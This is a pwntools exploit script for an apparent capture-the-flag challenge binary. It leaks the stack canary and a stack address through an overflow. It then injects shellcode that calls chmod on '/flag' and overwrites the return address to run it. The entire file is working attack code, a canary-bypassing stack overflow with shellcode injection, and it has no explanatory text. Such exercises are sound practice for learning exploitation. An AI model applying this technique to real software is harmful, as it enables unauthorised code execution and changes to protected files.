from pwn import *
context.arch='amd64'

r = process('/challenge/toddlerone_level6.1')
#r = process(['strace','/challenge/toddlerone_level6.1'])


r.sendline(b'500')
r.send(b'REPEAT\x41\x41' + b'a'*0x3f + b'c'*2)
r.recvuntil(b'aaaaaaac')
canary = u64(r.recv(8))-ord('c')
print(hex(canary))


## leak stack
r.sendline(b'500')
r.send(b'REPEAT\x41\x41' +b'a'*0x47 + b'c')
r.recvuntil(b'aaaaaaac')
stack = u64(r.recv(6) + b'\x00\x00')
print(hex(stack))

###  rop 1
ret_address = stack - 432
print(hex(ret_address))
r.sendline(b'1000')
payload2=asm(f'''
    push 90
    pop rax
    lea rdi, [rip+f]
    mov rsi, 511
    syscall

    f:
    .string "/flag"
''')
input()
r.send(payload2.ljust(0x3c,b'\x00') + p32(1) + p64(90) + p64(canary) + b'a' * 0x8 + p64(ret_address))

r.interactive()